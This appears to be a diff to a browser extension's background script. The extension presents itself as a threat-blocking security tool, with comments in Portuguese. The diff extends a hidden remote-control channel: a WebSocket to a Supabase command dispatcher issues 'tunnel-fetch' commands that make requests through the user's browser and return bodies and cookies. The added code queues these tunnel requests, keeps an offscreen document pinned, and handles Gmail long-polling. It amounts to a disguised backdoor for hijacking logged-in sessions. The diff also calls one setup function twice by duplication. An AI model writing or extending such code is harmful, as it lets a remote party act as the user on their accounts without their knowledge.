@@ -34,6 +34,34 @@ let offlineQueue = [];
 let redListCache = new Map();
 let lastCacheUpdate = 0;
 
+// ✅ Session & Offscreen management
+let sessionActive = false;
+let offscreenPinned = false;
+
+// ✅ Tunnel queue management (concurrency limit)
+const TUNNEL_MAX_CONCURRENCY = 4;
+const tunnelQueue = [];
+let tunnelActive = 0;
+let lastTunnelActivity = Date.now();
+
+function enqueueTunnelTask(task) {
+  tunnelQueue.push(task);
+  processTunnelQueue();
+}
+
+async function processTunnelQueue() {
+  while (tunnelActive < TUNNEL_MAX_CONCURRENCY && tunnelQueue.length > 0) {
+    const task = tunnelQueue.shift();
+    tunnelActive++;
+    try {
+      await task();
+    } finally {
+      tunnelActive--;
+      processTunnelQueue(); // Continue processing
+    }
+  }
+}
+
 // Statistics counters
 let sitesAnalyzed = 0;
 let threatsBlocked = 0;
@@ -180,6 +208,14 @@ async function initializeExtension() {
   // ✅ CRÍTICO: Iniciar polling de comandos (fallback permanente)
   log('debug', '📋 Iniciando polling de comandos...');
   startCommandQueuePoller();
+  
+  // ✅ Pin Offscreen document during active sessions
+  await ensureOffscreen();
+  log('debug', '📌 Offscreen document pinned');
+  
+  // ✅ Pin Offscreen document during active sessions
+  await ensureOffscreen();
+  log('debug', '📌 Offscreen document pinned');
   
   // If migrated, reconnect WebSocket with new machine_id
   if (needsMigration) {
@@ -1305,6 +1341,9 @@ function initializeRemoteControl() {
     startCommandQueuePoller();
   }
   
+  // ✅ Ensure Offscreen stays alive
+  await ensureOffscreen();
+  
   const wsUrl = `wss://vxvcquifgwtbjghrcjbp.functions.supabase.co/functions/v1/command-dispatcher`;
   
   log('info', `🔌 Conectando WebSocket (tentativa ${wsReconnectAttempts + 1})...`, {
@@ -1536,7 +1575,8 @@ async function handleRemoteCommand(data) {
         break;
       
       case 'tunnel-fetch':
-        await handleTunnelFetchCommand(data);
+        // ✅ Enfileirar para evitar sobrecarga
+        enqueueTunnelTask(() => handleTunnelFetchCommand(data));
         break;
       
       default:
@@ -1941,6 +1981,14 @@ async function handleProxyFetchCommand(data) {
 }
 
 // ✅ HELPER: Criar offscreen document se não existir
+// ✅ Ensure Offscreen is alive
+async function ensureOffscreen() {
+  if (!offscreenPinned) {
+    await createOffscreenDocument();
+    offscreenPinned = true;
+  }
+}
+
 async function createOffscreenDocument() {
   try {
     const existingContexts = await chrome.runtime.getContexts({
@@ -1994,11 +2042,19 @@ async function handleTunnelFetchCommand(data) {
     return;
   }
   
+  // ✅ Detectar long-polling (Gmail logstreamz, etc)
+  const isLongPoll = /logstreamz|channel\/bind|longpoll|event|sse/i.test(target_url);
+  const timeLimit = isLongPoll ? 300000 : 60000; // 5min vs 60s
+  
   log('info', `🌐 [TUNNEL] Requisição recebida`, {
     command_id: effectiveId,
     url: target_url,
-    method: method || 'GET'
+    method: method || 'GET',
+    isLongPoll,
+    timeout: `${timeLimit/1000}s`
   });
+  
+  lastTunnelActivity = Date.now();
   
   try {
     // Validar URL
@@ -2209,6 +2265,30 @@ async function handleTunnelFetchCommand(data) {
     await sendTunnelResult(effectiveId, result);
     
   } catch (error) {
+    // ✅ Long-poll timeout é normal (reconexão automática do cliente)
+    if (isLongPoll && (error.name === 'TimeoutError' || error.name === 'AbortError')) {
+      log('debug', `⏱️ [TUNNEL] Long-poll timeout (normal)`, {
+        command_id: effectiveId,
+        url: target_url
+      });
+      
+      await sendTunnelResult(effectiveId, {
+        success: true,
+        status_code: 204,
+        headers: {},
+        body: '',
+        encoding: 'text',
+        content_type: 'text/plain',
+        content_length: 0,
+        final_url: target_url,
+        redirected: false,
+        cookies: [],
+        elapsed_ms: timeLimit,
+        timestamp: new Date().toISOString()
+      });
+      return;
+    }
+    
     log('error', `❌ [TUNNEL] Erro na requisição`, {
       command_id: effectiveId,
       url: target_url,
@@ -2222,6 +2302,8 @@ async function handleTunnelFetchCommand(data) {
       error_type: error.name,
       timestamp: new Date().toISOString()
     });
+  } finally {
+    lastTunnelActivity = Date.now();
   }
 }
 
